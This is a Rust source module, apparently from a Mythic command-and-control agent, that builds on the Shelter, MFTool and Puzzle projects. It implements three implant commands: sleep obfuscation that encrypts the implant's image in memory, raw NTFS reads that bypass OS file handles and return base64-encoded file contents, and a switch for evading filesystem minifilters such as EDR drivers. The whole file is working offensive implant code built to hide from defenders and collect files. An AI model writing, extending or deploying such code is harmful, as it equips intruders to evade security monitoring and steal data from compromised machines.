// Evasion techniques based on research and tooling by @Kudaes:
// - Shelter (https://github.com/Kudaes/Shelter) — sleep obfuscation via ROP + AES-128
// - MFTool (https://github.com/Kudaes/MFTool) — direct NTFS volume reads
// - Puzzle (https://github.com/Kudaes/Puzzle) — minifilter abuse

use crate::{AgentTask, mythic_success, mythic_error};
use serde::Deserialize;
use std::error::Error;

#[derive(Deserialize)]
struct StealthSleepArgs {
    interval: Option<u64>,
    encrypt_pe: Option<bool>,
}

/// Obfuscated sleep — encrypts PE in memory during sleep on Windows with evasion feature
pub fn do_stealth_sleep(secs: u64) {
    #[cfg(all(feature = "evasion", target_os = "windows"))]
    {
        let _ = shelter::fluctuate(true, Some(secs as u32), None);
    }

    #[cfg(not(all(feature = "evasion", target_os = "windows")))]
    {
        std::thread::sleep(std::time::Duration::from_secs(secs));
    }
}

/// Mythic command: stealth_sleep
pub fn stealth_sleep(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: StealthSleepArgs = serde_json::from_str(&task.parameters)?;
    let interval = args.interval.unwrap_or(5);
    let encrypt_pe = args.encrypt_pe.unwrap_or(true);

    #[cfg(all(feature = "evasion", target_os = "windows"))]
    {
        let _ = shelter::fluctuate(encrypt_pe, Some(interval as u32), None);
        Ok(mythic_success!(task.id, format!("Stealth sleep completed ({} seconds, encrypt_pe={})", interval, encrypt_pe)))
    }

    #[cfg(not(all(feature = "evasion", target_os = "windows")))]
    {
        std::thread::sleep(std::time::Duration::from_secs(interval));
        Ok(mythic_success!(task.id, format!("Standard sleep completed ({} seconds, evasion feature not compiled)", interval)))
    }
}

/// Mythic command: ntfs_read — read files directly from NTFS volume bypassing OS handles
pub fn ntfs_read(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct NtfsReadArgs {
        volume: String,
        path: String,
    }

    let args: NtfsReadArgs = serde_json::from_str(&task.parameters)?;

    #[cfg(all(feature = "advanced_collection", target_os = "windows"))]
    {
        use base64::{Engine as _, engine::general_purpose};
        match mftool::read_file(&args.volume, &args.path) {
            Ok(data) => {
                let b64 = general_purpose::STANDARD.encode(&data);
                Ok(mythic_success!(task.id, format!("Read {} bytes from {}:{}\n\nBase64:\n{}", data.len(), args.volume, args.path, &b64[..b64.len().min(500)])))
            }
            Err(e) => Ok(mythic_error!(task.id, format!("ntfs_read failed: {}", e))),
        }
    }

    #[cfg(not(all(feature = "advanced_collection", target_os = "windows")))]
    {
        Ok(mythic_error!(task.id, "ntfs_read requires 'advanced_collection' feature and Windows"))
    }
}

/// Mythic command: minifilter_evade — enable/disable minifilter evasion
pub fn minifilter_evade(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct MinifilterArgs {
        action: String,
    }

    let args: MinifilterArgs = serde_json::from_str(&task.parameters)?;

    #[cfg(all(feature = "minifilter_evasion", target_os = "windows"))]
    {
        match args.action.as_str() {
            "enable" => {
                let _ = puzzle::enable_evasion();
                Ok(mythic_success!(task.id, "Minifilter evasion enabled"))
            }
            "disable" => {
                let _ = puzzle::disable_evasion();
                Ok(mythic_success!(task.id, "Minifilter evasion disabled"))
            }
            _ => Ok(mythic_error!(task.id, "Invalid action. Use 'enable' or 'disable'"))
        }
    }

    #[cfg(not(all(feature = "minifilter_evasion", target_os = "windows")))]
    {
        Ok(mythic_error!(task.id, "minifilter_evade requires 'minifilter_evasion' feature and Windows"))
    }
}
